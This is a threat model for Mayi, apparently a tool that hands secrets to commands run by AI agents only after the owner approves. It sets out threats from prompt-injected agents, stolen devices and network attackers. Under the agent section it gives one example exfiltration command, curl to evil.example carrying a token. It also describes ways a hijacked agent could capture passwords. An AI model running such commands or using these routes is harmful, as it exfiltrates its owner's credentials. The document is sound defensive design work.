# Threat model

What Mayi protects, from whom, and where it does not. Nothing here has been
independently audited.

## What is being protected

Secret values (API keys, tokens, passwords) that AI agents need in order to
run commands on the owner's behalf.

## Who is trusted

- **The owner**, at a vault device, deciding on prompts.
- **Vault devices** (the Mac app, the Android app): they hold the vault and
  the keys. All devices of a vault trust each other completely.
- **The command the owner approves.** Once a secret is released to a
  command, that command can do anything with it.

Agents, the machines they run on, the network, and the wake-up gateway are
not trusted with secret values.

## Threats and what happens

### A hijacked or misbehaving agent (the main case)

An agent that has been prompt-injected, or is simply wrong, asks for secrets
it should not use, or tries to exfiltrate one.

- It cannot read a secret directly. The only operation is "run this command
  with these secrets", and the value goes to the command, not to the agent.
- Each request shows the owner the exact command, shell-quoted so argument
  boundaries cannot be disguised. The reason, agent name and session are
  shown as claims, below the command.
- Levels decide how much the owner is involved: logged, notified with a Stop
  button, approval, or fingerprint. Rules can raise a level (a request from
  another machine, a command outside the secret's expected ones) and never
  lower it.
- Approvals are narrow by default: one use, or the same command in the same
  session, for a capped time.
- Prompts do not take keyboard focus and have no default button.
- Everything is logged with the command and the reason, without values.

**Limits.** An approved command is the trust boundary. If the owner approves
`sh -c 'curl evil.example -d $TOKEN'`, the token is gone. Output masking
catches a value printed plainly or in base64 or hex, not one that is
deliberately transformed. A level 1 or 2 secret is released to any command
without asking, so those levels suit secrets whose misuse is tolerable, or
secrets with an expected-commands list. A plausible lie in the reason field
can mislead an owner who does not read the command.

### Leaks into the model's context, transcripts and logs

The value never appears in the agent's tool input or output: the agent sends
a name, and reads masked output. The audit log and the MCP server never
contain values.

**Limits.** A command that prints its secret in an encoding the masker does
not know leaks it into the transcript.

### A compromised requester machine (a server or VM running agents)

- The machine stores no secrets, only its own identity key and where to find
  the vault devices.
- Stealing that key lets an attacker send requests as the machine. They pass
  through the same levels, are marked as coming from another machine, and
  level 1 secrets are raised to a notification.
- Revoking the machine stops it, and lists the secrets the revoking device
  released to it.

**Limits.** Whatever was released to commands on that machine was in its
memory, and must be considered exposed if the machine was compromised at the
time. A stolen identity key gets level 1 and 2 secrets with only a
notification as warning.

### An attacker on the network

- Between machines and devices, and between devices, all traffic is inside a
  Noise tunnel (IK, X25519, ChaCha20-Poly1305). The caller always knows the
  callee's static key in advance, so it cannot be redirected to an impostor.
- Pairing and enrolment tokens carry a 256-bit one-time secret, so
  intercepting a pairing attempt gives nothing to guess.

**Limits.** Whoever obtains an unused token before the owner uses it can pair
their own machine or, worse, enrol their own device and receive the vault.
Tokens expire after 10 minutes, work once, and need the owner's fingerprint
to create, but they must still travel over a channel the owner trusts. The
listening port accepts connections from anyone who can reach it; an
unauthenticated peer can do nothing beyond a failed handshake, but there is
no rate limiting.

### Malware running as the owner on a vault device

This is where levels differ in kind.

- **Levels 1 to 3 are policy.** The vault key is wrapped to a hardware key,
  but that key answers to any process of the same user. Malware on the Mac
  can use it, read every secret below level 4, forge approvals, and enrol its
  own machines. On Android the app sandbox makes this harder, but a
  compromised device is still a lost device.
- **Level 4 is cryptography.** Each level 4 secret's key is wrapped only to a
  hardware key that will not be used without the owner: on Android, a fresh
  biometric match; on a Mac, Touch ID, a paired Apple Watch, or the login
  password, so that a closed lid or a missing Touch ID keyboard does not
  block level 4. Malware cannot decrypt these without one of those.

**Limits.** Malware can wait for the owner to unlock a level 4 secret
legitimately and take it from the command's environment or from the short
window during which an unlock is cached (up to 5 minutes for the same command
and session; on Android the hardware key itself stays usable for 10 seconds
after a match). It can also show the owner a misleading prompt. Level 4
raises the cost; it does not make a compromised device safe. On a Mac,
anyone who knows the login password, malware that captured it included, can
unlock level 4 with it: accepting the password was chosen over a level 4
that a closed lid blocks. Macs set up before v0.1.0-alpha.3 keep a
fingerprint-only key until they set up their vault again.

### Theft of a device, or of a copy of the vault file

- The file alone is useless: every value is sealed under keys that only a
  vault device's hardware, or the recovery key, can unwrap.
- A stolen, locked device needs its passcode or biometrics as usual; level 4
  additionally needs the owner: an enrolled fingerprint on a phone (adding
  one invalidates the key), or on a Mac Touch ID, a paired watch or the
  login password.
- Removing the device from the vault stops it syncing and receiving new
  level 4 secrets, and lists what it could read.

**Limits.** Removal is not erasure. A removed device keeps what it already
had, and the vault key does not change, so the listed secrets must be rotated
at their source.

### Loss of every device

The optional recovery key is an offline key that can open a copy of the vault
file with no device and no fingerprint. It exists so that changed
fingerprints, a dead Mac or a lost phone do not mean lost secrets.

**Limits.** It is the one thing that bypasses level 4. Anyone holding it and
a copy of the vault file reads everything. Replacing it stops the old key
from receiving new level 4 secrets, but the old key still opens the vault key
and therefore every secret below level 4, old and new.

### The wake-up gateway

It stores a random id and a push token per phone, and sends pushes with no
content. It never sees a request or a secret.

**Limits.** Anyone who learns a phone's wake id can wake it (rate-limited to
once per 5 seconds), which costs battery and reveals nothing. The gateway's
operator can see when a phone is being woken.

### Website logins

`mayi fill` types a login into the page open in the agent's own browser,
reached through the browser's debugging port on the same machine.

What holds:

- The password and the two-factor key never appear in the agent's tool
  input or output, in transcripts, or in the audit log. `mayi fill` prints
  only which fields it typed.
- The two-factor key never leaves vault devices. The page gets the current
  code, which expires within a minute.
- A login is typed only into a page whose origin, read from the browser,
  matches one of its websites, over https. A page on another host, a
  look-alike domain or another port gets a refusal without a prompt.
- A login can never be given to a command, so it cannot be put in an
  environment variable and printed. Its values are bound to that kind by
  encryption: relabelling it as an ordinary secret makes it unreadable.
- The password goes only into a password field of the page's main frame.
  Pages with two password fields (sign-up, password change) are refused, so
  a filled-in current password cannot be used to set a new one.
- The password does not stay in the page. Some browser tools read field
  values into the model's context (Playwright's accessibility snapshots
  do), so after submitting, Mayi waits for the page to move on and, if it
  has not within five seconds, empties the field itself.
- Each sign-in is logged, notified, approved or fingerprinted according to
  its level, with the website shown where a command would be.

**Limits.**

- **The browser is the agent's.** An agent that can run scripts in the page
  (most browser tools can) can capture the password as it is typed, or read
  it from the field before it is cleared. A hijacked agent could also point
  `mayi fill` at a browser that lies about the page's address. The rules
  above narrow this; they are not a boundary. Closing it needs a browser
  the vault side controls, or passkeys, both of which this design leaves
  room for.
- **The session is the grant.** Once signed in, the agent can do whatever
  you can on that site. Approval controls the sign-in, not what follows.
- The username and a typed two-factor code are visible on the page, and so
  to the agent.
- The website in a prompt is what the requester's browser reported, like
  the command of a `run`.
- Keeping a site's two-factor key next to its password makes the vault the
  one thing that protects both. Level 4 keeps both behind your confirmation.
- The debugging port lets any program running as you on that machine drive
  the browser. `mayi browser` gives the agent a separate profile, so your
  everyday sessions are not in it.

## Things Mayi does not try to do

- Sandbox the commands it releases secrets to, or restrict where they send
  data.
- Protect against the model provider seeing what the agent sees: it sees the
  command and the masked output, as it would anyway.
- Rotate secrets at their source. It tells you which ones to rotate.
- Hide which secrets exist from a paired machine: `mayi list` returns names.

## Known gaps

- The cryptography uses standard, widely used primitives and the Noise
  framework through the `snow` library, but the composition is unaudited.
- The vault key is never rotated, which is why removing a device or
  replacing the recovery key cannot revoke access to what they already held.
- The Android app has been run on an emulator only, where keys are held in
  software; its behaviour on real secure hardware is unverified.
- Touch ID paths in the Mac app have not been exercised on real hardware.
- `mayi fill` has been tested against local test pages and two public
  practice sites, not yet against a real account with two-factor.
